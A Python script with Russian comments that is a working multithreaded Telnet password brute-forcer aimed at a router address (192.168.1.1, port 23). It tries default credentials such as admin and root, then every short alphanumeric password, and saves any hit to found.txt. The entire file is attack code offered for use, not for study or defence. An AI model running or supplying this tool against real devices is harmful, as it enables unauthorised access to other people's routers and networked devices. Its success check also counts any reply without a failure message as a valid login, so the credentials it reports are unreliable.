import socket
import threading
import itertools
import string
import os
import time
from queue import Queue

host = "192.168.1.1"  # IP адрес цели (замени на нужный)
port = 23             # Порт Telnet — обычно 23

max_threads = 5       # Количество потоков — для одновременных попыток входа
found = False         # Флаг — нашли ли успешный логин/пароль
lock = threading.Lock()  # Для потокобезопасного изменения переменной found

default_logins = ["admin", "root", "user", "guest", "test"]  # Стандартные логины для перебора
default_passwords = ["admin", "password", "123456", "12345678", "1234", "12345"]  # Пароли по умолчанию

charset = string.ascii_letters + string.digits  # Набор символов для генерации паролей (буквы и цифры)
min_len = 1          # Минимальная длина генерируемого пароля
max_len = 3          # Максимальная длина генерируемого пароля

def recv_until(sock, expected_list, timeout=7):
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(1024)
            if not chunk:
                break
            data += chunk
            print("DEBUG: Received chunk:", chunk.decode(errors='ignore'))
            for exp in expected_list:
                if exp in data:
                    return exp, data
    except socket.timeout:
        print("DEBUG: recv_until timed out")
    except Exception as e:
        print(f"DEBUG: recv_until error: {e}")
    return None, data

def try_login(username, password):
    global found
    if found:
        return
    try:
        print(f"DEBUG: Trying {username}:{password}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        print(f"DEBUG: Connecting to {host}:{port} ...")
        sock.connect((host, port))
        print("DEBUG: Connected")

        prompt, data = recv_until(sock, [b"login:", b"Login:"], timeout=7)
        if not prompt:
            print("DEBUG: No login prompt received, closing socket")
            sock.close()
            return

        print(f"DEBUG: Sending username: {username}")
        sock.sendall(username.encode() + b"\n")
        time.sleep(0.5)

        prompt, data = recv_until(sock, [b"Password:", b"password:"], timeout=7)
        if not prompt:
            print("DEBUG: No password prompt received, closing socket")
            sock.close()
            return

        print(f"DEBUG: Sending password: {password}")
        sock.sendall(password.encode() + b"\n")
        time.sleep(1)

        prompt, response = recv_until(sock, [b"incorrect", b"failed", b"Login incorrect"], timeout=7)
        if prompt:
            print(f"DEBUG: Login failed for {username}:{password}")
            sock.close()
            return
        else:
            with lock:
                if not found:
                    found = True
                    print(f"\n[!!!] УСПЕХ: {username}:{password}")
                    with open("found.txt", "a") as f:
                        f.write(f"{username}:{password}\n")
            sock.close()
            return
    except Exception as e:
        print(f"DEBUG: Exception during try_login: {e}")

def worker(q):
    while not q.empty() and not found:
        username, password = q.get()
        try_login(username, password)
        q.task_done()

def load_list(filename, default_list):
    if os.path.isfile(filename):
        with open(filename, "r") as f:
            lines = [line.strip() for line in f if line.strip()]
            if lines:
                return lines
    return default_list

def generate_passwords(charset, min_len, max_len):
    for length in range(min_len, max_len + 1):
        for pwd_tuple in itertools.product(charset, repeat=length):
            yield ''.join(pwd_tuple)

if __name__ == "__main__":
    logins = load_list("logins.txt", default_logins)
    passwords = load_list("passwords.txt", default_passwords)

    q = Queue()

    # Добавляем пары логин-пароль из файлов/дефолта
    for username in logins:
        for password in passwords:
            q.put((username, password))

    # Добавляем перебор паролей для каждого логина
    for username in logins:
        for password in generate_passwords(charset, min_len, max_len):
            q.put((username, password))

    threads = []
    for _ in range(max_threads):
        t = threading.Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

    if not found:
        print("\n[!!!] Пароль не найден.")
    else:
        print("\n[!!!] Готово, данные записаны в found.txt")
